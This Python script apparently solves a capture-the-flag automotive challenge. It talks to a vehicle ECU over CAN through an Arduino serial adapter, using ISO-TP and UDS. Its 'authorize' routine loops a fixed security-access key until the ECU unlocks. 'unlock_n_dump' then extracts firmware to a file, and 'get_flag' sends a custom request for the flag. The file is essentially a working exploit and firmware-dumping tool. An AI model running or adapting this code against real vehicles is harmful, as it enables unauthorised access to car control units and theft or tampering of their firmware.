#!python3

import serial
import threading
from time import sleep
import queue
import struct

canqueue = queue.Queue()
SNIFF = False
DEBUG = True

class CAN232:
    def __init__(self, id=0, payload=b''):
        self.id = id
        self.payload = payload
    
    def from_hex(self, data):
        self.id = int(data[:3], 16)
        size = int(data[3], 16)
        self.payload = bytes.fromhex(data[4:4 + size * 2])

    def to_hex(self):
        size = len(self.payload)
        if size > 8:
            size = 8
        return "{0:X}{1}{2}".format(self.id, size, self.payload[:size].hex().upper())
    
    def __str__(self):
        return "id: {0:#x} payload: {1}".format(self.id, self.payload)

class ISOTP:
    def __init__(self, id=0, payload=b'', is_response=False):
        self.id = id
        self.payload = payload
        self.is_response = is_response

    def __str__(self):
        if len(self.payload) >= 2:
            return "id: {0:#x}\tuds\tsid: {1:#x}\tsub: {2:#x}\tpayload: {3} ({4})".format(self.id, self.payload[0], self.payload[1], self.payload[2:], self.payload[2:].hex())
        else:
            return "id: {0:#x}\tpayload: {1} ({2})".format(self.id, self.payload, self.payload.hex())
    
    def to_can232(self):
        p = self.payload
        size = len(p)
        if size > 4095:
            size = 4095
        #
        if size >= 8:
            res = []
            first = CAN232(id=self.id)
            firsts = min(6, size)
            firstp = bytearray(8)
            firstp[0] = 1 << 4 | (size >> 8) & 7
            firstp[1] = size & 0xFF
            firstp[2:firsts] = p[:6]
            first.payload = bytes(firstp)
            p = p[firsts:]
            size -= firsts
            #
            res.append(first)
            #
            for i in range(1, 16):
                if size <= 0:
                    break
                other = CAN232(id=self.id)
                others = min(7, size)
                otherp = bytearray(8)
                otherp[0] = 2 << 4 | i
                otherp[1:others] = p[:7]
                other.payload = bytes(otherp)
                #
                size -= others
                p = p[others:]
                #
                res.append(other)
            return res
        else:
            first = CAN232(id=self.id)
            firstp = bytearray(8)
            firstp[0] = size
            firstp[1:min(7, size)] = p[:7]
            first.payload = bytes(firstp)
            return [first,]
            

class SerialReaderThread(threading.Thread):
    def __init__(self, tty):
        threading.Thread.__init__(self)
        self.tty = tty
        self.stopped = threading.Event()
        self.can232_current = {}
        self.requested = False

    def readline(self, separator=b'\r'):
        res = ''
        while True:
            c = tty.read(1)
            if c == separator or c == b'':
                return res
            else:
                res += c.decode("utf-8")

    def get_can232(self):
        global SNIFF
        # arduino should be flashed with https://github.com/latonita/arduino-canbus-monitor
        while True: 
            msg = self.readline()
            if msg == '':
                continue
            # print(msg)
            #
            if msg[0] == '\x07':
                self.requested = True
                msg = msg.lstrip('\x07')
            #
            if msg[0] == 't':
                can232 = CAN232()
                can232.from_hex(msg[1:])
                if SNIFF:
                    print(can232, can232.to_hex())
                yield can232
            else:
                print("skip message: {0}".format(repr(msg)))
            if self.stopped.is_set():
                return
    
    def get_isotp(self, can232_iter):
        for can232 in can232_iter:
            i = can232.id
            p = can232.payload
            typ = p[0] >> 4
            if   typ == 0:
                size = p[0] & 7
                isotp = ISOTP(id=i, payload=p[1:1 + size])
                yield isotp
            elif typ == 1:
                isotp = ISOTP(id=i, payload=p[2:])
                size =  ((p[0] & 7) << 8) + p[1]
                self.can232_current[i] = (isotp, size)
            elif typ == 2:
                if i not in self.can232_current:
                    print("skipping: {0}".format(can232.to_hex()))
                    continue
                isotp, size = self.can232_current[i]
                isotp.payload += p[1:]
                if len(isotp.payload) >= size:
                    isotp.payload = isotp.payload[:size]
                    yield isotp
                    del self.can232_current[i]
            else:
                raise ValueError("bad type: {0}".format(typ))

    def run(self):
        global canqueue
        for isotp in self.get_isotp(self.get_can232()):
            if self.requested:
                canqueue.put(isotp)
                self.requested = False
                print("@@@", isotp)
            else:
                if SNIFF:
                    print(">>>", isotp)
                pass
    
    def stop(self):
        self.stopped.set()

def send_cmd(tty, cmd):
    global DEBUG
    if DEBUG:
        print("->", cmd)
    tty.write(bytes(cmd + "\r", "utf-8"))
    tty.flush()

def send_isotp(tty, isotp):
    for can232 in isotp.to_can232():
        cmd = "t" + can232.to_hex()
        send_cmd(tty, cmd)

def init_can232(tty):
    send_cmd(tty, "S2") # set 50kbps
    send_cmd(tty, "O")  # listen & receive
    sleep(2)

def sr(tty, request, must_prefix=None):
    global canqueue, DEBUG
    
    while True:
        if DEBUG:
            print("-->", request)
        send_isotp(tty, request)
        #
        response = canqueue.get()
        canqueue.task_done()
        #
        if not must_prefix or response.payload.startswith(must_prefix):
            if DEBUG:
                print("<--", response)
            return response

def sniff(tty):
    global SNIFF
    SNIFF = True
    sleep(30)

def authorize(tty, can_id):
    set_maintenance_mode = ISOTP(id=can_id, payload=b'\x10\x02')
    sr(tty, set_maintenance_mode, must_prefix=b'\x50\x02')
    # unlock
    while True:
        get_seed = ISOTP(id=can_id, payload=b'\x27\x01')
        sr(tty, get_seed)
        #
        send_response = ISOTP(id=can_id, payload=b'\x27\x02\xAB\xCD') # d0a1
        resp = sr(tty, send_response)
        if resp.payload.startswith(b'\x67\x02') or resp.payload.startswith(b'\x7f\x27\x24'):
            break
        sleep(0.01)

def unlock_n_dump(tty, skip_unlock=False):
    can_id = 0x7E0

    addr = 0x000
    size = 0x100
    filename = 'fw.bin'
    #
    if not skip_unlock:
        authorize(tty, can_id)
        sleep(1)
    # get firmware
    while True:
        fw = b''
        print("FW!")
        inp = input("enter> ")
        if inp == "":
            break
        inps = inp.split(",")
        addr = int(inps[0], 16)
        if len(inps) > 1:
            size = int(inps[1], 16)
        if len(inps) > 2:
            filename = inps[2]

        request_download = ISOTP(id=can_id, payload=b'\x35\x00\x22' + struct.pack(">HH", addr, size))
        resp = sr(tty, request_download)#, must_prefix=)
        if not resp.payload.startswith(b'\x75'):
            print("ERR!")
            continue
        block_size = resp.payload[2]
        num_packets = size // block_size + 1
        for i in range(num_packets):
            transfer_request = ISOTP(id=can_id, payload=b'\x36' + struct.pack(">B", i + 1))
            resp = sr(tty, transfer_request, must_prefix=b'\x76' + struct.pack(">B", i + 1))
            fw += resp.payload[2:2 + block_size]
            sleep(0.2)
        print("WRITING FW!")
        with open(filename, "wb") as f:
            f.write(fw)
        #
        exit_transfer = ISOTP(id=can_id, payload=b'\x37')
        sr(tty, exit_transfer)

def get_flag(tty, skip_unlock=False):
    can_id = 0x7D3
    #
    if not skip_unlock:
        authorize(tty, can_id)
        sleep(1)
    #
    flag = ISOTP(id=can_id, payload=b'\xa0\x00')
    sr(tty, flag)

def just_test(tty):
    can_id = 0x7E0
    addr = 0
    size = 0x1000
    request_download = ISOTP(id=can_id, payload=b'\x35\x00\x22' + struct.pack(">HH", addr, size))
    sr(tty, request_download)

tty = serial.Serial(port="/dev/ttyUSB1",baudrate=115200)
srt = SerialReaderThread(tty)
srt.setDaemon(True)
srt.start()
init_can232(tty)

# sniff(tty)
# just_test(tty)
get_flag(tty)
# unlock_n_dump(tty)

sleep(2)